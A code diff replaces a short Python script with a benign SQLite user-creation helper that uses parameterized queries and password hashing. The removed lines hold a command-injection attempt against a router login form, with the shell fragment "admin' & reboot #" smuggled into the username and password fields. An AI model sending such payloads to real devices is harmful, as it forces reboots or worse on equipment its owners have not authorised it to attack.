@@ -1,27 +1,34 @@
-import requests
+import sqlite3
 
-url = "http://192.168.1.1/boaform/admin/formLogin"
+from werkzeug.security import generate_password_hash
 
-payload = {
-    "username1": "admin' & reboot #",
-    "psd1": "admin' & reboot #",
-    "verification_code": "qc5z8",
-    "username": "admin' & reboot #",
-    "psd": "admin' & reboot #",
-    "sec_lang": "0",
-    "loginSelinit": "",
-    "ismobile": "",
-    "csrftoken": "00a8baa9b6ffdwada0b54a194f9233f35eceb",
-}
+DB_NAME = "database.db"
 
-headers = {
-    "User-Agent": "Mozilla/5.0",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Referer": "http://192.168.1.1/admin/login.asp",
-    "Origin": "http://192.168.1.1",
-}
 
-response = requests.post(url, data=payload, headers=headers)
+def create_user(username, password):
+    conn = sqlite3.connect(DB_NAME)
+    cur = conn.cursor()
 
-print("Status:", response.status_code)
-print(response.text)
+    try:
+        hashed_password = generate_password_hash(password)
+
+        cur.execute(
+            "INSERT INTO users (username, password) VALUES (?, ?)",
+            (username, hashed_password),
+        )
+
+        conn.commit()
+        print(f"✅ User '{username}' created successfully")
+
+    except sqlite3.IntegrityError:
+        print("❌ Username already exists")
+
+    finally:
+        conn.close()
+
+
+if __name__ == "__main__":
+    username = input("Enter username: ")
+    password = input("Enter password: ")
+
+    create_user(username, password)
